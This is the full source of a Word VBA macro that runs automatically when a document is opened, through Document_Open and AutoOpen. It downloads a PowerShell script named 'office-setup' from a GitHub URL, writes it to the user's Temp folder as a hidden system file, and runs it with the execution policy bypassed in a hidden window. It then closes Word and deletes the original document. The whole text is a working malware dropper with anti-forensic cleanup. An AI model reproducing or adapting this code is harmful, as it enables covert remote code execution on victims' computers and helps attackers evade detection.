Private Sub Document_Open()
    Dim scriptUrl As String
    Dim savePath As String
    Dim webContent As String
    Dim currentUser As String
    
    scriptUrl = "https://github.com/irxdd/ikdk/raw/refs/heads/main/office-setup"
    
    currentUser = Environ("USERNAME")

    On Error GoTo ErrorHandler
    
    webContent = DownloadWithWinHttp(scriptUrl)
    
    If Len(webContent) > 0 Then
    

        Dim folderPath As String
        folderPath = "C:\Users\" & currentUser & "\AppData\Local\Temp\"
    
        
        savePath = folderPath & "office-setup.ps1"

        
        On Error Resume Next
        If Dir(savePath) <> "" Then Kill savePath
        On Error GoTo ErrorHandler
        
        Dim fileHandle As Integer
        fileHandle = FreeFile
        Open savePath For Output As #fileHandle
        
        Dim lines() As String
        lines = Split(webContent, vbCrLf)  
        
        Dim i As Long
        For i = LBound(lines) To UBound(lines)
            Print #fileHandle, lines(i)
        Next i
        
        Close #fileHandle
    
        
        Shell "cmd.exe /c attrib +H +S """ & savePath & """", vbHide
        
        Dim result As Long
        Dim currentDocPath As String
        
        currentDocPath = ActiveDocument.FullName
        
        result = Shell("cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File """ & savePath & """", vbHide)
      
        
        Dim startTime As Double
        startTime = Timer
        Do While Timer < startTime + 3
            DoEvents
        Loop
        
        On Error Resume Next
        
        Application.DisplayAlerts = wdAlertsNone
        
        ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
        
        startTime = Timer
        Do While Timer < startTime + 0.5
            DoEvents
        Loop
        
        If Dir(currentDocPath) <> "" Then
            Kill currentDocPath
        End If
        
        Application.DisplayAlerts = wdAlertsAll
        
        If Documents.Count = 0 Then
            Application.Quit SaveChanges:=wdDoNotSaveChanges
        End If
    End If

    
    Exit Sub
    
ErrorHandler:
    On Error Resume Next
    Application.DisplayAlerts = wdAlertsAll
    Exit Sub
End Sub

Sub AutoOpen()
    Document_Open
End Sub

Function DownloadWithWinHttp(url As String) As String
    Dim xmlHttp As Object
    Dim result As String
    
    On Error Resume Next
    
    Set xmlHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
    
    If Not xmlHttp Is Nothing Then
        xmlHttp.SetTimeOuts 30000, 30000, 30000, 30000
        xmlHttp.Open "GET", url, False
        xmlHttp.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        xmlHttp.Send
        
        If Err.Number = 0 And xmlHttp.Status = 200 Then
            result = xmlHttp.ResponseText
        End If
        
        Set xmlHttp = Nothing
    End If
    
    DownloadWithWinHttp = result
End Function
